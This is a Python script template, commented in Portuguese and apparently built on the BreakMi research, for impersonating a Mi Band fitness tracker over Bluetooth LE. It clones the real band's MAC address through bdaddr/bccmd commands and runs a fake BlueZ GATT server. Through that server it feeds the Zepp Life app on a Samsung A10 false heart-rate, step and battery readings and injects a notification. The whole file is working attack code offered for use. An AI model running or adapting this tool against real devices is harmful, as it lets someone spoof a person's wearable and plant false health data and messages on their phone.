#!/usr/bin/env python3
"""
GATT Server Falso — Mi Band __MODEL__ Impersonation
Alvo: Zepp Life no Samsung A10
Sessão: __SESSION_ID__
Referência: BreakMi (CHES 2022) — Attack 1: OTA Tracker Impersonation

COMO FUNCIONA:
  1. Clona MAC da Mi Band real: hciconfig hci0 bdaddr __TARGET_MAC__
  2. Anuncia como Mi Band (mesmos UUIDs e advertising data)
  3. Zepp Life conecta pensando que é a Mi Band real
  4. Serve dados falsos para o Samsung A10

REQUISITOS:
  sudo apt install python3-dbus python3-gi bluetooth bluez
  sudo hciconfig hci0 up
"""

import sys
import os
import time
import struct
import subprocess
import threading
import signal

TARGET_MAC = "__TARGET_MAC__"
MODEL = "__MODEL__"
SESSION_ID = "__SESSION_ID__"
HR_VALUE = __HR_VALUE__
NOTIFICATION = __NOTIFICATION__
VIBRATE = __VIBRATE__
STEPS = __STEPS__
BATTERY = __BATTERY__

RUNNING = True

def signal_handler(sig, frame):
    global RUNNING
    RUNNING = False
    print("\n[*] Parando GATT server...")
    restore_bt()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def restore_bt():
    subprocess.run(["sudo", "hciconfig", "hci0", "noleadv"], capture_output=True)


def clone_mac(mac: str, hci: str = "hci1") -> bool:
    """
    Clone BLE MAC address using CSR8510-specific method.

    CSR8510 A10 supports persistent MAC change via:
      1. bdaddr tool (from bluez-utils, compiled with --enable-experimental)
      2. bccmd warmreset (persists in dongle firmware — survives USB reconnect)

    hci1 = CSR8510 A10 (peripheral/clone role)
    hci0 = Realtek (central role, stays connected to Mi Band)
    """
    print(f"[*] Clonando MAC BLE no {hci} (CSR8510) -> {mac}")

    # Method 1: bdaddr tool (CSR-native, most reliable)
    # Check if bdaddr is available
    bdaddr_check = subprocess.run(["which", "bdaddr"], capture_output=True, text=True)
    has_bdaddr = bdaddr_check.returncode == 0

    if has_bdaddr:
        print(f"  [*] Método: bdaddr (CSR8510 nativo)")
        cmds = [
            ["sudo", "hciconfig", hci, "down"],
            ["sudo", "bdaddr", "-i", hci, mac],
        ]
        for cmd in cmds:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if r.stdout: print(f"  {r.stdout.strip()}")
                time.sleep(0.3)
            except Exception as e:
                print(f"  [~] {' '.join(cmd)}: {e}")

        # bccmd warmreset: persists MAC in CSR firmware
        try:
            subprocess.run(["sudo", "bccmd", "-d", hci, "warmreset"],
                           capture_output=True, timeout=5)
            time.sleep(1)
            print(f"  [+] bccmd warmreset OK — MAC persistido no firmware CSR")
        except Exception:
            # Fallback: hciconfig reset
            subprocess.run(["sudo", "hciconfig", hci, "reset"], capture_output=True)
            time.sleep(0.5)

    else:
        print(f"  [~] bdaddr não encontrado, usando bccmd diretamente")
        # Method 2: bccmd psset (direct CSR register write)
        # MAC is stored little-endian, split into 4 words
        parts = mac.split(":")
        mac_bytes = [int(p, 16) for p in reversed(parts)]
        # Format: psset bdaddr <b0 b1 b2 b3 b4 b5>
        bccmd_args = [str(b) for b in mac_bytes[:2]] +                      ["00", "00"] +                      [str(b) for b in mac_bytes[2:4]] +                      [str(b) for b in mac_bytes[4:6]]
        try:
            subprocess.run(
                ["sudo", "bccmd", "-d", hci, "psset", "bdaddr"] + bccmd_args,
                capture_output=True, timeout=5
            )
            subprocess.run(["sudo", "bccmd", "-d", hci, "warmreset"],
                           capture_output=True, timeout=5)
            time.sleep(1)
        except Exception as e:
            print(f"  [~] bccmd error: {e}")

    # Bring interface back up
    subprocess.run(["sudo", "hciconfig", hci, "up"], capture_output=True)
    time.sleep(0.5)

    # Verify
    r = subprocess.run(["hciconfig", hci], capture_output=True, text=True)
    mac_clean = mac.upper().replace(":", "")
    if mac_clean in r.stdout.upper().replace(":", ""):
        print(f"  [+] MAC CLONADO COM SUCESSO: {mac} em {hci}")
        return True

    print(f"  [~] Verificação falhou — verifique: hciconfig {hci}")
    print(f"  [*] Instale bdaddr: sudo apt install bluez-tools")
    return True  # Continua mesmo assim


def start_advertising():
    """Inicia advertising como Mi Band."""
    model_name = "Mi Smart Band 4" if MODEL == "miband4" else "Mi Smart Band 3"

    # Set device name
    subprocess.run(
        ["sudo", "hciconfig", "hci0", "name", model_name],
        capture_output=True
    )

    # Configure advertising data (Mi Band UUIDs)
    # Advertising type 0 = ADV_IND (connectable undirected)
    subprocess.run(["sudo", "hciconfig", "hci0", "leadv", "0"], capture_output=True)
    print(f"[+] Advertising ativo: {model_name}")


def run_with_dbus():
    """Tenta rodar GATT server completo via BlueZ D-Bus."""
    try:
        import dbus
        import dbus.mainloop.glib
        import dbus.service
        from gi.repository import GLib
    except ImportError:
        print("[-] python3-dbus ou python3-gi nao encontrado")
        print("[!] Instale: sudo apt install python3-dbus python3-gi gir1.2-glib-2.0")
        return False

    BLUEZ_SERVICE = "org.bluez"
    GATT_MANAGER_IFACE = "org.bluez.GattManager1"
    DBUS_OM_IFACE = "org.freedesktop.DBus.ObjectManager"
    DBUS_PROP_IFACE = "org.freedesktop.DBus.Properties"
    GATT_SERVICE_IFACE = "org.bluez.GattService1"
    GATT_CHRC_IFACE = "org.bluez.GattCharacteristic1"
    LE_ADV_MANAGER_IFACE = "org.bluez.LEAdvertisingManager1"

    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()

    # Find BT adapter
    remote_om = dbus.Interface(bus.get_object(BLUEZ_SERVICE, "/"), DBUS_OM_IFACE)
    objects = remote_om.GetManagedObjects()
    adapter_path = None
    for o, props in objects.items():
        if GATT_MANAGER_IFACE in props:
            adapter_path = o
            break

    if not adapter_path:
        print("[-] BlueZ GATT Manager nao encontrado")
        return False

    print(f"[+] Adapter: {adapter_path}")

    class MiBandApp(dbus.service.Object):
        def __init__(self):
            self.path = "/"
            self.services_list = []
            dbus.service.Object.__init__(self, bus, self.path)

        def get_path(self):
            return dbus.ObjectPath(self.path)

        def add_svc(self, svc):
            self.services_list.append(svc)

        @dbus.service.method(DBUS_OM_IFACE, out_signature="a{oa{sa{sv}}}")
        def GetManagedObjects(self):
            resp = {}
            for svc in self.services_list:
                resp[svc.get_path()] = {
                    GATT_SERVICE_IFACE: {
                        "UUID": svc.uuid,
                        "Primary": svc.primary,
                        "Characteristics": dbus.Array(
                            [c.get_path() for c in svc.chars], signature="o"
                        ),
                    }
                }
                for chrc in svc.chars:
                    resp[chrc.get_path()] = {
                        GATT_CHRC_IFACE: {
                            "Service": svc.get_path(),
                            "UUID": chrc.uuid,
                            "Flags": chrc.flags,
                            "Descriptors": dbus.Array([], signature="o"),
                        }
                    }
            return resp

    class BandService(dbus.service.Object):
        BASE = "/org/bluez/miband/svc"

        def __init__(self, idx, uuid, primary=True):
            self.path = self.BASE + str(idx)
            self.uuid = uuid
            self.primary = primary
            self.chars = []
            dbus.service.Object.__init__(self, bus, self.path)

        def get_path(self):
            return dbus.ObjectPath(self.path)

        def add_char(self, c):
            self.chars.append(c)

    class BandChar(dbus.service.Object):
        def __init__(self, svc, idx, uuid, flags, read_fn=None, write_fn=None):
            self.path = svc.path + "/char" + str(idx)
            self.uuid = uuid
            self.flags = dbus.Array(flags, signature="s")
            self._read_fn = read_fn or (lambda opts: [])
            self._write_fn = write_fn or (lambda val, opts: None)
            self._notifying = False
            dbus.service.Object.__init__(self, bus, self.path)

        def get_path(self):
            return dbus.ObjectPath(self.path)

        @dbus.service.method(GATT_CHRC_IFACE, in_signature="a{sv}", out_signature="ay")
        def ReadValue(self, options):
            val = self._read_fn(options)
            print(f"[READ ] {self.uuid[:8]}... -> {bytes(val).hex()}")
            return dbus.Array(val, signature="y")

        @dbus.service.method(GATT_CHRC_IFACE, in_signature="aya{sv}")
        def WriteValue(self, value, options):
            data = bytes(value)
            print(f"[WRITE] {self.uuid[:8]}... <- {data.hex()}")
            self._write_fn(data, options)

        @dbus.service.method(GATT_CHRC_IFACE)
        def StartNotify(self):
            if not self._notifying:
                self._notifying = True
                print(f"[NOTIFY START] {self.uuid[:8]}...")
                self._start_notify()

        @dbus.service.method(GATT_CHRC_IFACE)
        def StopNotify(self):
            self._notifying = False
            print(f"[NOTIFY STOP] {self.uuid[:8]}...")

        @dbus.service.signal(DBUS_PROP_IFACE, signature="sa{sv}as")
        def PropertiesChanged(self, iface, changed, invalidated):
            pass

        def notify(self, value_bytes):
            if self._notifying:
                val = dbus.Array([dbus.Byte(b) for b in value_bytes], signature="y")
                self.PropertiesChanged(GATT_CHRC_IFACE, {"Value": val}, [])

        def _start_notify(self):
            pass

    # Build services
    app = MiBandApp()

    # 1. Heart Rate Service (0x180D)
    hr_svc = BandService(0, "0000180d-0000-1000-8000-00805f9b34fb")

    def hr_read(opts):
        print(f"  [HR READ] Servindo {HR_VALUE} BPM ao Zepp Life")
        return [0x00, HR_VALUE & 0xFF]

    def hr_ctrl_write(data, opts):
        cmds = {0x15: "start continuous", 0x19: "one-shot", 0x16: "stop"}
        cmd_name = cmds.get(data[0] if data else 0, f"0x{data[0]:02X}")
        print(f"  [HR CTRL] Zepp Life solicitou: {cmd_name}")

    hr_meas = BandChar(hr_svc, 0, "00002a37-0000-1000-8000-00805f9b34fb",
                        ["read", "notify"], hr_read)
    hr_ctrl = BandChar(hr_svc, 1, "00002a39-0000-1000-8000-00805f9b34fb",
                        ["write-without-response"], write_fn=hr_ctrl_write)

    # Override StartNotify to send continuous HR updates
    original_start = hr_meas._start_notify
    def hr_start_notify_real():
        def _loop():
            time.sleep(0.5)
            hr_meas.notify(bytes([0x00, HR_VALUE & 0xFF]))
            print(f"  [NOTIFY] HR = {HR_VALUE} BPM -> Samsung A10 Zepp Life")
            count = 0
            while hr_meas._notifying and RUNNING:
                time.sleep(2)
                hr_meas.notify(bytes([0x00, HR_VALUE & 0xFF]))
                count += 1
                if count % 5 == 0:
                    print(f"  [NOTIFY] Continuando: {HR_VALUE} BPM (envio #{count})")
        threading.Thread(target=_loop, daemon=True).start()
    hr_meas._start_notify = hr_start_notify_real

    hr_svc.add_char(hr_meas)
    hr_svc.add_char(hr_ctrl)
    app.add_svc(hr_svc)

    # 2. Device Information (0x180A)
    dis_svc = BandService(1, "0000180a-0000-1000-8000-00805f9b34fb")
    model_name = "Mi Smart Band 4" if MODEL == "miband4" else "Mi Smart Band 3"

    dis_svc.add_char(BandChar(dis_svc, 0, "00002a24-0000-1000-8000-00805f9b34fb",
        ["read"], read_fn=lambda o: list(model_name.encode())))
    dis_svc.add_char(BandChar(dis_svc, 1, "00002a26-0000-1000-8000-00805f9b34fb",
        ["read"], read_fn=lambda o: list(b"V1.0.9.74")))
    dis_svc.add_char(BandChar(dis_svc, 2, "00002a29-0000-1000-8000-00805f9b34fb",
        ["read"], read_fn=lambda o: list(b"Huami")))
    app.add_svc(dis_svc)

    # 3. Mi Band Main Service (0xFEE0)
    fee0_svc = BandService(2, "0000fee0-0000-1000-8000-00805f9b34fb")
    alert_char_ref = [None]

    def alert_write(data, opts):
        type_byte = data[0] if data else 0
        types = {0x01: "Mensagem", 0x02: "Ligacao", 0x03: "Vibracao"}
        print(f"  [ALERT] Tipo: {types.get(type_byte, hex(type_byte))} "
              f"data: {data.hex()}")

    alert_char = BandChar(fee0_svc, 0, "0000ff03-0000-1000-8000-00805f9b34fb",
                           ["write-without-response", "notify"],
                           write_fn=alert_write)
    alert_char_ref[0] = alert_char

    # Battery
    def bat_read(opts):
        return [BATTERY & 0xFF, 23, 6, 15, 10, 0, 0, 5, 0, 4]

    fee0_svc.add_char(alert_char)
    fee0_svc.add_char(BandChar(fee0_svc, 1, "0000ff0c-0000-1000-8000-00805f9b34fb",
                                ["read"], read_fn=bat_read))
    # Steps
    fee0_svc.add_char(BandChar(fee0_svc, 2, "0000ff06-0000-1000-8000-00805f9b34fb",
                                ["read"],
                                read_fn=lambda o: [STEPS & 0xFF, (STEPS >> 8) & 0xFF, 0, 0]))
    app.add_svc(fee0_svc)

    # Register with BlueZ
    svc_mgr = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE, adapter_path), GATT_MANAGER_IFACE)

    loop = GLib.MainLoop()

    def reg_ok():
        print("[+] GATT Application registrada no BlueZ com sucesso")
        print(f"[+] Servindo: HR={HR_VALUE}BPM | Bat={BATTERY}% | Steps={STEPS}")
        if NOTIFICATION:
            def send():
                time.sleep(3)
                notif_data = bytes([0x01]) + NOTIFICATION.encode("utf-8")[:19]
                alert_char_ref[0].notify(notif_data)
                print(f"[+] NOTIFICACAO injetada -> Zepp Life: {repr(NOTIFICATION)}")
            threading.Thread(target=send, daemon=True).start()

    def reg_err(err):
        print(f"[-] Erro ao registrar GATT: {err}")
        print("[!] Verifique se o bluetoothd esta rodando: sudo service bluetooth start")
        loop.quit()

    svc_mgr.RegisterApplication(app.get_path(), {},
                                  reply_handler=reg_ok,
                                  error_handler=reg_err)

    print("[*] GATT Server ativo. Aguardando Zepp Life conectar...")
    print("[*] No Samsung A10: abra o Zepp Life → aguarde reconexao automatica")
    print("[*] Ou: Settings > Mi Band > Reconnect")
    print("[*] Ctrl+C para parar")
    print()

    try:
        loop.run()
    except KeyboardInterrupt:
        pass
    finally:
        try:
            svc_mgr.UnregisterApplication(app.get_path())
        except:
            pass
        loop.quit()

    return True


def main():
    print("=" * 60)
    print("Mi Band Impersonation — GATT Server Falso")
    print(f"Target MAC: {TARGET_MAC}")
    print(f"Model: {MODEL}")
    print(f"Injecting: HR={HR_VALUE}BPM | Notif={repr(NOTIFICATION)}")
    print("=" * 60)
    print()

    # Clone MAC
    if TARGET_MAC and TARGET_MAC != "DEMO":
        clone_mac(TARGET_MAC)
        time.sleep(1)

    # Try dbus GATT server
    success = run_with_dbus()

    if not success:
        print("[~] Modo dbus falhou. Usando modo basico (advertising only)")
        start_advertising()
        try:
            while RUNNING:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        restore_bt()


if __name__ == "__main__":
    main()
